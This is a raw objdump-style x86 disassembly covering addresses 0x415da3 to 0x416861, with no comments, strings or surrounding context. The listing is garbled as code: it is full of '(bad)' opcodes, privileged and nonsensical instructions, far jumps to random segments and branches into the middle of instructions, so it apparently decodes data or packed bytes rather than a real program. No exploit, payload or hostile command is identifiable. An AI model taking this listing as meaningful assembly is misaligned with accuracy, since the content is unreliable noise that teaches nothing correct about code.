  415da3:	xchg   edi,eax
  415da4:	add    bh,BYTE PTR [ecx]
  415da6:	xchg   ebp,eax
  415da7:	rol    BYTE PTR [ecx-0x79],cl
  415daa:	or     eax,0x86cc6d6b
  415daf:	into   
  415db0:	pop    esi
  415db1:	aam    0x9d
  415db3:	ja     0x415dfa
  415db5:	icebp  
  415db6:	mov    BYTE PTR [ebp-0x547ea098],al
  415dbc:	push   edx
  415dbd:	ficomp DWORD PTR [edi+0x67]
  415dc0:	push   cs
  415dc1:	repnz adc eax,0xaa4ffcd4
  415dc7:	jmp    0x415e2c
  415dc9:	jp     0x415da3
  415dcb:	test   BYTE PTR [edi-0x440b400b],bl
  415dd1:	pop    edi
  415dd2:	idiv   DWORD PTR [eax+0x56]
  415dd5:	sub    ebx,DWORD PTR [ebx+0x2ad0d918]
  415ddb:	jne    0x415da0
  415ddd:	sbb    bh,BYTE PTR [eax+0x3c]
  415de0:	pop    ebp
  415de1:	repz mov cs,WORD PTR [eax+0x55]
  415de5:	cmp    DWORD PTR [edi],ecx
  415de7:	xchg   esi,eax
  415de8:	int    0x84
  415dea:	adc    ecx,DWORD PTR [ecx+0x5e]
  415ded:	mov    DWORD PTR [edi+0x6],ebp
  415df0:	into   
  415df1:	out    0x66,eax
  415df3:	loop   0x415d94
  415df5:	xor    ebx,edx
  415df7:	dec    eax
  415df8:	adc    eax,esi
  415dfa:	stos   BYTE PTR es:[edi],al
  415dfb:	mov    cl,0x81
  415dfd:	jle    0x415d8f
  415dff:	(bad)  
  415e00:	xor    eax,0x2bfdcae1
  415e05:	enter  0x27fb,0x53
  415e09:	std    
  415e0a:	test   al,0x10
  415e0c:	inc    eax
  415e0d:	rcr    DWORD PTR [ebp-0x67],0x7d
  415e11:	fstp   TBYTE PTR [ecx+0x40]
  415e14:	stc    
  415e15:	cmp    DWORD PTR [ecx+0x333e89e5],esi
  415e1b:	call   0x7ec966e8
  415e20:	test   eax,0xaf89aa39
  415e25:	pop    ebp
  415e26:	add    DWORD PTR [eax-0x478ad55],ebp
  415e2c:	test   al,0xce
  415e2e:	sbb    eax,0x53f1cf5d
  415e33:	lods   al,BYTE PTR ds:[esi]
  415e34:	(bad)  
  415e35:	fbstp  TBYTE PTR [esi]
  415e37:	jbe    0x415e1a
  415e39:	gs pop edx
  415e3b:	sub    BYTE PTR ds:0x653e067e,dl
	...
  415eb1:	add    BYTE PTR [eax],al
  415eb3:	add    BYTE PTR [edi],dh
  415eb5:	data16 xor al,0x9b
  415eb8:	jne    0x415e95
  415eba:	mov    edi,0xdeb84bee
  415ebf:	outs   dx,DWORD PTR gs:[esi]
  415ec1:	sbb    eax,0xf01313cd
  415ec6:	add    BYTE PTR [eax],al
  415ec8:	cmc    
  415ec9:	add    BYTE PTR [eax],al
  415ecb:	add    BYTE PTR [eax+0x29],al
  415ece:	in     al,0xb9
  415ed0:	pop    ebp
  415ed1:	pop    ecx
  415ed2:	dec    esp
  415ed3:	inc    edi
  415ed4:	push   edx
  415ed5:	fadd   QWORD PTR [ecx]
  415ed7:	push   esi
  415ed8:	jl     0x415f48
  415eda:	cwde   
  415edb:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  415edd:	popa   
  415ede:	in     al,0xcc
  415ee0:	jb     0x415f2b
  415ee2:	cmp    eax,DWORD PTR [esi-0xe]
  415ee5:	sub    al,0xd4
  415ee7:	adc    BYTE PTR [esi],bl
  415ee9:	(bad)  
  415eea:	rcl    BYTE PTR [esi+0x3c],1
  415eed:	(bad)  
  415eee:	(bad)  
  415eef:	or     BYTE PTR [edx-0x44],al
  415ef2:	pop    eax
  415ef3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  415ef5:	(bad)  [edi-0x71]
  415ef8:	mov    cl,0x7b
  415efa:	and    dh,0xe6
  415efd:	nop
  415efe:	inc    ecx
  415eff:	mov    eax,ds:0xc2a1964f
  415f04:	pop    ebp
  415f05:	popa   
  415f06:	jbe    0x415f3a
  415f08:	out    0xd6,al
  415f0a:	jecxz  0x415f1b
  415f0c:	xlat   BYTE PTR ds:[ebx]
  415f0d:	mov    ah,0x78
  415f0f:	jmp    0xfbdb04c1
  415f14:	fdiv   QWORD PTR [ebx]
  415f16:	sahf   
  415f17:	sub    DWORD PTR [ebx],esi
  415f19:	fadd   QWORD PTR [ebp-0x2309c5a5]
  415f1f:	and    al,0xec
  415f21:	(bad)  
  415f22:	mov    ebp,0x4284affe
  415f27:	loope  0x415f95
  415f29:	push   edx
  415f2a:	and    BYTE PTR [edi-0x4927a846],bh
  415f30:	push   edx
  415f31:	mov    WORD PTR [ecx+0x31],ds
  415f34:	mov    WORD PTR [ecx+0x5ca774b1],ds
  415f3a:	imul   eax,DWORD PTR [edi+0x5d67d759],0x484edfbe
  415f44:	adc    BYTE PTR [ebp-0x57724c71],al
  415f4a:	outs   dx,BYTE PTR ds:[esi]
  415f4b:	enter  0x9470,0x87
  415f4f:	xchg   ebx,eax
  415f50:	std    
  415f51:	push   ds
  415f52:	pop    ecx
  415f53:	mov    dh,0xd6
  415f55:	xchg   edi,eax
  415f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f57:	dec    ebx
  415f58:	cmp    eax,0xc944b2fe
  415f5d:	add    al,0xb2
  415f5f:	leave  
  415f60:	les    ecx,FWORD PTR [esi+0x5978a9d0]
  415f66:	shr    BYTE PTR [eax-0x4e],cl
  415f69:	gs xchg ah,dl
  415f6c:	mov    ecx,esp
  415f6e:	mov    esp,0x780a2452
  415f73:	cld    
  415f74:	pop    ebx
  415f75:	pop    ebx
  415f76:	mov    cl,bl
  415f78:	js     0x415fec
  415f7a:	jb     0x415f8c
  415f7c:	adc    eax,0x1971db6f
  415f81:	push   ebp
  415f82:	mov    al,ds:0x9768835d
  415f87:	fcom   DWORD PTR gs:[ebx-0x7c580023]
  415f8e:	iret   
  415f8f:	loopne 0x415fae
  415f91:	push   ebp
  415f92:	mov    al,ds:0x6a8aa2da
  415f97:	inc    eax
  415f98:	jne    0x415fa7
  415f9a:	(bad)  
  415f9b:	xor    DWORD PTR [esi-0x7f],ebx
  415f9e:	adc    eax,0xf8e7a573
  415fa3:	sub    edi,esi
  415fa5:	das    
  415fa6:	scas   al,BYTE PTR es:[edi]
  415fa7:	loopne 0x415f4c
  415fa9:	iret   
  415faa:	inc    ecx
  415fab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fac:	(bad)  [ebx+0xe]
  415faf:	mov    ds:0x18d08ba,eax
  415fb4:	pop    esi
  415fb5:	ror    BYTE PTR [ebp-0x7f976f5e],1
  415fbb:	push   ebx
  415fbc:	stos   BYTE PTR es:[edi],al
  415fbd:	mov    ebx,0xba677b
	...
  416032:	add    BYTE PTR [eax],al
  416034:	jnp    0x416038
  416036:	add    ebp,ebx
  416038:	jnp    0x416025
  41603a:	sti    
  41603b:	xchg   edx,eax
  41603c:	rol    al,cl
  41603e:	(bad)  
  41603f:	imul   edi,DWORD PTR [esi+ecx*2],0x26
  416043:	or     cl,BYTE PTR [eax]
  416045:	icebp  
  416046:	add    BYTE PTR [eax],al
  416048:	cmc    
  416049:	add    BYTE PTR [eax],al
  41604b:	add    BYTE PTR [eax],bl
  41604d:	add    al,0x86
  41604f:	test   DWORD PTR [esi+0x6d],edx
  416052:	hlt    
  416053:	in     eax,dx
  416054:	and    BYTE PTR [eax],0x3
  416057:	mov    di,0x8724
  41605b:	mov    eax,edi
  41605d:	inc    ebp
  41605e:	jae    0x4160c2
  416060:	mov    bh,0xbb
  416062:	mov    ebp,0x4be36ab6
  416067:	outs   dx,DWORD PTR ds:[esi]
  416068:	push   ecx
  416069:	je     0x41602a
  41606b:	push   ss
  41606c:	add    eax,0xdb526381
  416071:	add    BYTE PTR [edi],0xd
  416074:	outs   dx,BYTE PTR ds:[esi]
  416075:	mov    ah,0x70
  416077:	pop    ebx
  416078:	push   eax
  416079:	mov    ds:0x1d17765f,al
  41607e:	jne    0x4160f8
  416080:	mov    ds:0x111e7927,eax
  416085:	dec    edx
  416086:	jp     0x416064
  416088:	lods   al,BYTE PTR ds:[esi]
  416089:	mov    cl,0xa0
  41608b:	xchg   esp,eax
  41608c:	(bad)  
  41608d:	push   ecx
  41608e:	mov    WORD PTR [ecx*2+0xdda544b],gs
  416095:	xchg   ecx,eax
  416096:	aas    
  416097:	pop    esp
  416098:	das    
  416099:	dec    ebx
  41609a:	loopne 0x4160d5
  41609c:	push   ebx
  41609d:	mov    eax,0x51cbeb65
  4160a2:	push   edi
  4160a3:	sar    cl,cl
  4160a5:	ja     0x416036
  4160a7:	push   ecx
  4160a8:	fnstsw WORD PTR [ebp+0x51]
  4160ab:	jbe    0x4160ac
  4160ad:	mov    dl,BYTE PTR [edi]
  4160af:	sub    al,BYTE PTR [ebx+0x98e9089]
  4160b5:	jg     0x416049
  4160b7:	push   es
  4160b8:	xchg   edi,eax
  4160b9:	mov    ebp,0x3ecccae0
  4160be:	cmp    BYTE PTR [ebx+0x73eeede2],0x80
  4160c5:	ja     0x4160d9
  4160c7:	in     eax,0xd0
  4160c9:	mov    ebp,0x48c512a8
  4160ce:	shl    DWORD PTR [esi-0xc8b98ce],0x67
  4160d5:	in     eax,dx
  4160d6:	pop    ebp
  4160d7:	push   esi
  4160d8:	cwde   
  4160d9:	jns    0x41606a
  4160db:	xchg   edx,eax
  4160dc:	call   0x6124:0x5febef88
  4160e3:	mov    cl,0x33
  4160e5:	imul   ecx,DWORD PTR [ecx+ebx*2],0x23
  4160e9:	aaa    
  4160ea:	inc    edx
  4160eb:	dec    esp
  4160ec:	xlat   BYTE PTR ds:[ebx]
  4160ed:	sub    eax,0x24c8e298
  4160f2:	adc    BYTE PTR [eax],ch
  4160f4:	mov    cl,0xd5
  4160f6:	dec    edi
  4160f7:	inc    ebx
  4160f8:	js     0x416105
  4160fa:	jecxz  0x41612e
  4160fc:	mov    ecx,0xfe53ac90
  416101:	retf   
  416102:	ficomp DWORD PTR [ebx+0x64937558]
  416108:	(bad)  
  416109:	cs dec eax
  41610b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41610c:	push   ebp
  41610d:	mov    esi,0x6dea240c
  416112:	ss scas eax,DWORD PTR es:[edi]
  416114:	push   cs
  416115:	out    dx,eax
  416116:	add    al,0x8f
  416118:	sahf   
  416119:	ins    BYTE PTR es:[edi],dx
  41611a:	jmp    0x88b8485c
  41611f:	out    0xc9,al
  416121:	inc    edx
  416122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416123:	fisub  WORD PTR [eax+eax*8+0x7e6de43d]
  41612a:	ret    0xcb3e
  41612d:	test   eax,0x6396827d
  416132:	xlat   BYTE PTR ds:[ebx]
  416133:	out    dx,al
  416134:	adc    BYTE PTR [ecx-0x75ff087e],ah
  41613a:	xchg   esp,eax
  41613b:	std    
  41613c:	xchg   DWORD PTR [ebx-0x80],ecx
  41613f:	test   cl,dh
	...
  4161b1:	add    BYTE PTR [eax],al
  4161b3:	add    BYTE PTR [edi+edx*4],ch
  4161b6:	pop    ds
  4161b7:	sar    DWORD PTR [edi-0x8001127],1
  4161bd:	test   al,0xcb
  4161bf:	sub    edx,DWORD PTR [ecx-0x23e5c80]
  4161c5:	icebp  
  4161c6:	add    BYTE PTR [eax],al
  4161c8:	cmc    
  4161c9:	add    BYTE PTR [eax],al
  4161cb:	add    BYTE PTR [esi+0x33],bh
  4161ce:	and    ah,dl
  4161d0:	mov    DWORD PTR [edx],edi
  4161d2:	dec    ebx
  4161d3:	mov    esp,0xf1e4c7c1
  4161d8:	xor    eax,0x7b93c2fb
  4161dd:	dec    ebp
  4161de:	jb     0x4161b3
  4161e0:	cs jecxz 0x416202
  4161e3:	js     0x1b750f55
  4161e9:	mov    BYTE PTR [ebp+eiz*4-0x13df802d],ch
  4161f0:	pop    ds
  4161f1:	mov    edi,0xf532f5a9
  4161f6:	(bad)
  4161fa:	or     eax,0xb9af5915
  4161ff:	jae    0x416266
  416201:	adc    al,0x8b
  416203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416204:	sub    dl,BYTE PTR [ecx+0x5a]
  416207:	dec    ebp
  416208:	call   0x1e:0xc85abdba
  41620f:	cmp    ebx,ebx
  416211:	sti    
  416212:	inc    ecx
  416213:	dec    esp
  416214:	dec    ebx
  416215:	shl    dh,0x7a
  416218:	outs   dx,BYTE PTR ds:[esi]
  416219:	mov    BYTE PTR [esi-0x4af1f3a1],0x95
  416220:	in     al,0x66
  416222:	mul    al
  416224:	bound  ebp,QWORD PTR [eax-0x50dfa485]
  41622a:	jne    0x4161ff
  41622c:	scas   al,BYTE PTR es:[edi]
  41622d:	lahf   
  41622e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41622f:	in     eax,dx
  416230:	gs lock cmp eax,0x7c6d0c12
  416237:	fadd   st(0),st
  416239:	push   esp
  41623a:	sbb    BYTE PTR [esi+edi*4-0x6de893d0],al
  416241:	push   edi
  416242:	mov    eax,ds:0xaf2db05f
  416247:	(bad)  
  416248:	adc    eax,DWORD PTR [esi+ebx*8-0x721a1757]
  41624f:	xor    BYTE PTR [edi],bl
  416251:	sub    BYTE PTR [ebp-0x6a5bdd9d],dh
  416257:	icebp  
  416258:	adc    BYTE PTR ds:0x56751c10,ah
  41625e:	lods   al,BYTE PTR ds:[esi]
  41625f:	mov    ds:0x724a2a0c,eax
  416264:	dec    ebx
  416265:	xor    edi,DWORD PTR [ebx]
  416267:	inc    edx
  416268:	in     al,0x41
  41626a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41626b:	ins    DWORD PTR es:[edi],dx
  41626c:	jnp    0x41620f
  41626e:	xor    edx,DWORD PTR gs:[ecx-0x65]
  416272:	nop
  416273:	fisttp DWORD PTR [ebx]
  416275:	cmc    
  416276:	shl    DWORD PTR [eax-0x4770badd],1
  41627c:	mov    WORD PTR [ecx],?
  41627e:	mov    ebx,0xeac50a92
  416283:	jae    0x4162a9
  416285:	gs clc 
  416287:	ror    DWORD PTR [esi-0x6],0x38
  41628b:	or     DWORD PTR [ebp-0x71],esp
  41628e:	rcl    DWORD PTR ds:0xb2c81e2a,cl
  416294:	jno    0x416226
  416296:	imul   al
  416298:	dec    edx
  416299:	(bad)  
  41629a:	(bad)  
  41629b:	adc    ebp,DWORD PTR [edx+0x33]
  41629e:	mov    ch,0xa
  4162a0:	ret    0xdda7
  4162a3:	dec    edi
  4162a4:	inc    ebp
  4162a5:	add    ah,al
  4162a7:	jno    0x41624c
  4162a9:	ret    0x3a66
  4162ac:	jbe    0x41625d
  4162ae:	sbb    ecx,DWORD PTR [esi]
  4162b0:	ja     0x416298
  4162b2:	fldcw  WORD PTR [esi+ebx*1]
  4162b5:	pop    edx
  4162b6:	ret    
  4162b7:	jne    0x416321
  4162b9:	nop
  4162ba:	(bad)  
  4162bb:	push   DWORD PTR [edx]
  4162bd:	test   eax,0x703119
	...
  416332:	add    BYTE PTR [eax],al
  416334:	ins    DWORD PTR es:[edi],dx
  416335:	lock repz jmp FWORD PTR cs:[edi]
  41633a:	std    
  41633b:	repz push eax
  41633d:	xchg   ecx,eax
  41633e:	scas   al,BYTE PTR es:[edi]
  41633f:	fucomp st(3)
  416341:	jno    0x416394
  416343:	jmp    0x42563a
  416348:	cmc    
  416349:	add    BYTE PTR [eax],al
  41634b:	add    BYTE PTR [edx],ah
  41634d:	jbe    0x416333
  41634f:	push   ss
  416350:	pop    esi
  416351:	(bad)  
  416353:	(bad)  
  416354:	jae    0x416377
  416356:	mov    WORD PTR [eax-0x826e58b],cs
  41635c:	adc    al,0x36
  41635e:	data16 fsubr QWORD PTR [ecx+0x24]
  416362:	mov    eax,ds:0xb5459b0d
  416367:	test   DWORD PTR [edi-0xbdf5481],eax
  41636d:	nop
  41636e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41636f:	punpckhwd mm1,QWORD PTR [esp+ebp*1+0x243c238b]
  416377:	cmp    eax,0xe89b3d87
  41637c:	repnz adc dl,BYTE PTR [esi]
  41637f:	dec    esi
  416380:	cdq    
  416381:	ins    BYTE PTR es:[edi],dx
  416382:	jge    0x41635b
  416384:	cmc    
  416385:	cwde   
  416386:	or     eax,0xc39f2f8d
  41638b:	jp     0x41631f
  41638d:	cmp    bl,BYTE PTR ds:0xe61b0424
  416393:	xchg   DWORD PTR gs:[esi+0x2cb0a5d7],edx
  41639a:	shl    DWORD PTR [ecx-0x3a],1
  41639d:	add    dh,ah
  41639f:	out    0x8e,eax
  4163a1:	shl    BYTE PTR [ecx+0x184ca625],cl
  4163a7:	sub    eax,0xbc095be0
  4163ac:	adc    al,0x39
  4163ae:	js     0x4163fe
  4163b0:	dec    BYTE PTR [ebx+0x5b]
  4163b3:	inc    edi
  4163b4:	push   0xb0e91777
  4163b9:	rol    edx,cl
  4163bb:	adc    DWORD PTR [ebx+0x11],eax
  4163be:	push   cs
  4163bf:	lods   eax,DWORD PTR ds:[esi]
  4163c0:	pop    esp
  4163c1:	inc    ecx
  4163c2:	dec    ebx
  4163c3:	push   0xee7cc472
  4163c8:	call   0x8ee47f6a
  4163cd:	les    ebp,FWORD PTR [edx+0x420dd642]
  4163d3:	aad    0x69
  4163d5:	fldenv [esi]
  4163d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163d8:	mov    ebp,0x22b6afc7
  4163dd:	dec    esp
  4163de:	pop    edi
  4163df:	rcl    dl,1
  4163e1:	lock add ah,ah
  4163e4:	inc    eax
  4163e5:	icebp  
  4163e6:	jns    0x416423
  4163e8:	das    
  4163e9:	(bad)  
  4163ea:	hlt    
  4163eb:	push   ebp
  4163ec:	data16 sub al,0xea
  4163ef:	dec    esi
  4163f0:	and    al,0xb1
  4163f2:	jne    0x416408
  4163f4:	inc    ebx
  4163f5:	sbb    al,0x1
  4163f7:	jmp    0x1f28:0xb35e7771
  4163fe:	sub    al,0x78
  416400:	call   0x8e3a8df5
  416405:	cwde   
  416406:	pop    ss
  416407:	xor    al,0x6e
  416409:	xor    bl,0xb5
  41640c:	pop    ds
  41640d:	cdq    
  41640e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41640f:	jb     0x41644b
  416411:	jmp    0x416418
  416413:	cmp    BYTE PTR [edx+0x5a026878],dl
  416419:	sbb    esp,DWORD PTR [edx+0x407a1636]
  41641f:	sar    BYTE PTR [ebx+0x43],1
  416422:	sub    DWORD PTR [ebp+edi*2+0x38d788a7],esp
  416429:	xor    eax,0xa70b147e
  41642e:	ins    BYTE PTR es:[edi],dx
  41642f:	xchg   DWORD PTR [eax],edi
  416431:	push   ebx
  416432:	(bad)  
  416433:	mov    edi,ss
  416435:	pop    eax
  416436:	or     esi,ebx
  416438:	jge    0x41640e
  41643a:	lahf   
  41643b:	rcl    BYTE PTR [edx],1
  41643d:	pop    esp
  41643e:	pop    ds
  41643f:	mov    bl,0x9
	...
  4164b1:	add    BYTE PTR [eax],al
  4164b3:	add    ah,ah
  4164b5:	lock sub DWORD PTR [edx],ecx
  4164b8:	cmp    eax,0x4cfee7db
  4164bd:	or     BYTE PTR [ebx-0xa],ah
  4164c0:	clc    
  4164c1:	jbe    0x416460
  4164c3:	daa    
  4164c4:	out    0xf3,eax
  4164c6:	add    BYTE PTR [eax],al
  4164c8:	cmc    
  4164c9:	add    BYTE PTR [eax],al
  4164cb:	add    BYTE PTR [edi],ch
  4164cd:	xor    BYTE PTR [ecx-0x1d],0xae
  4164d1:	mov    edi,DWORD PTR [esi-0x78949120]
  4164d7:	sahf   
  4164d8:	sbb    dh,bh
  4164da:	mov    ah,0x5
  4164dc:	cmp    BYTE PTR [edx],al
  4164de:	sub    bh,bl
  4164e0:	jp     0x4164bb
  4164e2:	(bad)  
  4164e3:	fiadd  WORD PTR [ecx]
  4164e5:	jge    0x41646c
  4164e7:	mov    DWORD PTR ss:[edx+0x5f5445af],esi
  4164ee:	enter  0xbf5a,0x2d
  4164f2:	stc    
  4164f3:	push   ecx
  4164f4:	imul   eax,DWORD PTR [esi],0xffffffaf
  4164f7:	push   esp
  4164f8:	or     eax,0x607fbf76
  4164fd:	out    0x5b,eax
  4164ff:	mov    esp,0xf9ebfd45
  416504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416505:	call   0x24b0725e
  41650a:	pop    ss
  41650b:	fcmovb st,st(2)
  41650d:	mov    bh,0x7
  41650f:	in     al,0x1d
  416511:	fcmovnbe st,st(6)
  416513:	inc    ebx
  416514:	rcl    BYTE PTR [ecx+edi*1+0x7c],cl
  416518:	cmp    BYTE PTR [eax],bh
  41651a:	xchg   esp,eax
  41651b:	xlat   BYTE PTR ds:[ebx]
  41651c:	retf   
  41651d:	pop    esi
  41651e:	mov    ecx,0xc9b271c9
  416523:	cmp    eax,0x47fa0eab
  416528:	ficom  WORD PTR [eax-0x7795f42]
  41652e:	stos   DWORD PTR es:[edi],eax
  41652f:	xchg   esi,eax
  416530:	jle    0x416585
  416532:	loope  0x4165af
  416534:	cs repz pop ds
  416537:	aaa    
  416538:	popf   
  416539:	xor    dh,BYTE PTR [edx]
  41653b:	push   esp
  41653c:	and    bl,BYTE PTR [edx+0x714c5b4b]
  416542:	xor    al,BYTE PTR [ebx+0x12b5e086]
  416548:	xchg   edi,eax
  416549:	sub    eax,0x409c6c32
  41654e:	or     eax,0xdf8a9ced
  416553:	mov    dl,0x55
  416555:	or     DWORD PTR [ecx],ebx
  416557:	rcr    bl,cl
  416559:	mov    bh,0x9d
  41655b:	lods   eax,DWORD PTR ds:[esi]
  41655c:	inc    esp
  41655d:	fmul   DWORD PTR [ebp+0xb]
  416560:	out    dx,al
  416561:	popa   
  416562:	dec    esi
  416563:	jns    0x4165d4
  416565:	in     al,dx
  416566:	test   bl,0x45
  416569:	mov    al,0xa8
  41656b:	jg     0x4165c8
  41656d:	js     0x41655c
  41656f:	cmp    BYTE PTR [eax],ch
  416571:	imul   eax,DWORD PTR [ecx-0x4c],0xac009de6
  416578:	inc    esp
  416579:	and    al,BYTE PTR [eax]
  41657b:	sbb    DWORD PTR [ecx-0x38],ebp
  41657e:	jne    0x4165e3
  416580:	inc    edi
  416581:	jmp    0x5da4dba1
  416586:	mov    ch,0x89
  416588:	push   esp
  416589:	scas   eax,DWORD PTR es:[edi]
  41658a:	(bad)  [ebx]
  41658c:	xchg   esi,eax
  41658d:	fmul   QWORD PTR [ecx-0x6ee8ec80]
  416593:	stos   DWORD PTR es:[edi],eax
  416594:	mov    eax,0x3bb0608a
  416599:	inc    esp
  41659a:	jbe    0x41656d
  41659c:	into   
  41659d:	stos   DWORD PTR es:[edi],eax
  41659e:	aas    
  41659f:	or     bh,BYTE PTR [eax-0x4d]
  4165a2:	repz xor dh,BYTE PTR [ebx]
  4165a5:	and    dl,cl
  4165a7:	mov    eax,ds:0x4936f44a
  4165ac:	ss jmp 0x1996afad
  4165b2:	fs ret 
  4165b4:	push   ss
  4165b5:	in     al,0xa8
  4165b7:	pop    eax
  4165b8:	mov    ebp,0xbf1106c9
  4165bd:	jne    0x416603
  4165bf:	arpl   WORD PTR [edx],bp
	...
  416631:	add    BYTE PTR [eax],al
  416633:	add    BYTE PTR [ebp-0x66],ch
  416636:	mov    esp,0xfd67ff45
  41663b:	mov    edx,0xd5f418cb
  416640:	int    0x83
  416642:	push   edx
  416643:	jae    0x416621
  416645:	hlt    
  416646:	add    BYTE PTR [eax],al
  416648:	cmc    
  416649:	add    BYTE PTR [eax],al
  41664b:	add    BYTE PTR [edx+ebx*4+0x3a],bh
  41664f:	pop    ebp
  416650:	cdq    
  416651:	mov    esp,0x7b8a6200
  416656:	bound  eax,QWORD PTR [eax+0x25]
  416659:	xchg   edi,eax
  41665a:	dec    edx
  41665b:	cdq    
  41665c:	push   edi
  41665d:	cmp    bl,BYTE PTR [ebp+ebx*2-0x2e]
  416661:	xchg   esi,eax
  416662:	in     al,dx
  416663:	cli    
  416664:	cmp    al,0xcd
  416666:	xchg   edi,eax
  416667:	jmp    0xe217:0x81568ad0
  41666e:	push   ebp
  41666f:	call   0x690a8533
  416674:	inc    esi
  416675:	aam    0xf6
  416677:	aas    
  416678:	call   0xb08:0x78e4ef46
  41667f:	sub    cl,ch
  416681:	mov    bl,0x1c
  416683:	jno    0x416699
  416685:	mov    ds:0x17afc348,al
  41668a:	sbb    eax,0x5ee8aa34
  41668f:	and    DWORD PTR [eax+0x76266d4e],edx
  416695:	ss dec edi
  416697:	popa   
  416698:	xchg   esi,eax
  416699:	jge    0x4166a0
  41669b:	inc    edx
  41669c:	push   ss
  41669d:	mov    ch,bl
  41669f:	popf   
  4166a0:	jae    0x416685
  4166a2:	jbe    0x416693
  4166a4:	shl    BYTE PTR [eax-0x56a63a03],cl
  4166aa:	sub    eax,0x68881983
  4166af:	into   
  4166b0:	pop    esi
  4166b1:	pop    esi
  4166b2:	mov    al,ds:0x3af5441a
  4166b7:	cmp    BYTE PTR [edx+0x32],al
  4166ba:	dec    edi
  4166bb:	lea    esp,[eax+0x45]
  4166be:	lods   eax,DWORD PTR ds:[esi]
  4166bf:	call   0xf9bb21d4
  4166c4:	push   DWORD PTR [ecx]
  4166c6:	loopne 0x4166c3
  4166c8:	xchg   ebp,eax
  4166c9:	sub    esi,DWORD PTR [edi+esi*1+0x71f1e239]
  4166d0:	test   eax,0xef409921
  4166d5:	fmul   QWORD PTR [edx]
  4166d7:	add    DWORD PTR [ebp-0x48],eax
  4166da:	retf   0x4366
  4166dd:	dec    esi
  4166de:	scas   al,BYTE PTR es:[edi]
  4166df:	add    ebx,edi
  4166e1:	imul   ebp,DWORD PTR [edi+0x7f],0xfacf9db5
  4166e8:	idiv   cl
  4166ea:	and    al,0x72
  4166ec:	cmc    
  4166ed:	mov    edx,?
  4166ef:	jno    0x4166e7
  4166f1:	mov    dh,al
  4166f3:	dec    ebp
  4166f4:	or     ch,BYTE PTR [edx-0x5b]
  4166f7:	retf   
  4166f8:	mov    cl,0x6d
  4166fa:	ret    
  4166fb:	std    
  4166fc:	jnp    0x416735
  4166fe:	dec    ecx
  4166ff:	ins    BYTE PTR es:[edi],dx
  416700:	outs   dx,BYTE PTR ds:[esi]
  416701:	mov    esi,0xf0382c42
  416706:	popa   
  416707:	(bad)  
  416708:	cs loope 0x416742
  41670b:	ja     0x416716
  41670d:	cs push es
  41670f:	mul    ch
  416711:	aad    0x28
  416713:	mov    ebx,0x869632c4
  416718:	in     eax,0xd7
  41671a:	and    BYTE PTR [esp+edi*2+0x4129d135],ah
  416721:	pop    ebx
  416722:	inc    edi
  416723:	mov    bl,0x70
  416725:	fs in  al,0x6d
  416728:	inc    edi
  416729:	mov    esi,0x8e2794cd
  41672e:	sar    DWORD PTR [ebx+0x6ff5c5ed],cl
  416734:	scas   eax,DWORD PTR es:[edi]
  416735:	aad    0x49
  416737:	mov    WORD PTR [edi+ebx*4-0x2b091d28],?
  41673e:	sub    DWORD PTR [eax],ebx
  416740:	push   0x0
	...
  4167b1:	add    BYTE PTR [eax],al
  4167b3:	add    bl,cl
  4167b5:	(bad)  
  4167b6:	xchg   ebx,eax
  4167b7:	in     al,dx
  4167b8:	mov    bh,0xed
  4167ba:	(bad)  
  4167bb:	push   DWORD PTR [ecx+0x19]
  4167be:	comiss xmm1,DWORD PTR [edi-0x70]
  4167c2:	mul    BYTE PTR ds:0xf5d1
  4167c8:	cmc    
  4167c9:	add    BYTE PTR [eax],al
  4167cb:	add    BYTE PTR [esp+ebp*8-0x5dfb00c9],dl
  4167d2:	retf   
  4167d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167d4:	sub    cl,BYTE PTR [esi]
  4167d6:	repz iret 
  4167d8:	popf   
  4167d9:	fwait
  4167da:	sub    dh,BYTE PTR [ebx-0x78]
  4167dd:	out    0x7b,al
  4167df:	and    eax,0x3fef3e6
  4167e4:	jge    0x41683d
  4167e6:	das    
  4167e7:	mov    ds:0xb5f5e513,al
  4167ec:	cdq    
  4167ed:	js     0x4167df
  4167ef:	or     eax,0x53b66ceb
  4167f4:	pop    ebp
  4167f5:	mov    ebp,0x3865a0d2
  4167fa:	add    DWORD PTR [esp+ecx*4-0x4c29ae66],ebp
  416801:	sub    DWORD PTR [ebx+0x7dd92f79],edx
  416807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416808:	or     DWORD PTR [ebx-0x1e],ebx
  41680b:	mov    eax,0x5e5dd4fb
  416810:	add    al,0x58
  416812:	add    ah,BYTE PTR [ebx-0x4a]
  416815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416816:	pop    ds
  416817:	push   esi
  416818:	dec    ecx
  416819:	loope  0x4167ad
  41681b:	pop    edx
  41681c:	ins    BYTE PTR es:[edi],dx
  41681d:	dec    esp
  41681e:	dec    ecx
  41681f:	fst    QWORD PTR [esi]
  416821:	fsubp  st(0),st
  416823:	sbb    DWORD PTR [edx],eax
  416825:	pop    ss
  416826:	push   edi
  416827:	inc    ecx
  416828:	stc    
  416829:	or     eax,0x2a4bc6fd
  41682e:	ja     0x4168ac
  416830:	out    dx,eax
  416831:	sar    DWORD PTR [ebx],0x20
  416834:	aam    0x1b
  416836:	mov    ebx,0xdf9f3162
  41683b:	adc    eax,DWORD PTR [eax+0x36]
  41683e:	xchg   esp,eax
  41683f:	and    ah,BYTE PTR [edx-0x49f06c5a]
  416845:	adc    esp,eax
  416847:	xchg   DWORD PTR [edx],edi
  416849:	(bad)  [eax+0x74d9b4e1]
  41684f:	mov    eax,0xde2f679b
  416854:	mov    esi,0x9918b55f
  416859:	loopne 0x416859
  41685b:	cmp    ch,BYTE PTR [ecx+0x42f1a5d0]
  416861:	add    BYTE PTR [edx-0x53],dl
